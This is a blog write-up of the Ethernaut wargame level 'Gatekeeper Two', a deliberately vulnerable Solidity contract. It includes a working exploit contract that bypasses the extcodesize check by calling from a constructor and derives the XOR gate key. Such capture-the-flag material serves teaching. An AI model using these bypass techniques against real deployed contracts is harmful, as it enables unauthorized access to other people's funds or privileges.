---
layout: post
title: Ethernaut - 14. Gatekeeper Two
date:  2022-09-27
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌑🌑
> This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.<br />
Things that might help:
- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. [See](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) here for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.


## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Writeup
There are three gates we need to pass.
- Gate one : Using the contract to call the method. `msg.sender` will be the contract address and `tx.origin` will be my account address.
- Gate two : When contract is being created, code size (extcodesize) is 0. Write all code in `constructor()` to pass the check. To learn more detail, you can visit [this website](https://solidity-by-example.org/hacks/contract-size/).
- Gate three : If a ^ b = c then c ^ a = b . We can use this logic to derive the value of `_gateKey`. To learn more detail, you can visit [this website](https://medium.com/@imolfar/bitwise-operations-and-bit-manipulation-in-solidity-ethereum-1751f3d2e216).

1. Get new instance.
2. Create a new contract.
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity >=0.8.0 <0.9.0;

    interface IGatekeeperTwo {
        function enter(bytes8 _gateKey) external returns (bool);
    }

    contract GatekeeperTwoExploiter {
        constructor() {
            unchecked{
                bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
                IGatekeeperTwo(YOUR_INSTANCE_ADDRESS).enter(key);
            }
        }
    }
    ```
3. Compile and deploy.
4. Submit instance ξ( ✿＞◡❛)


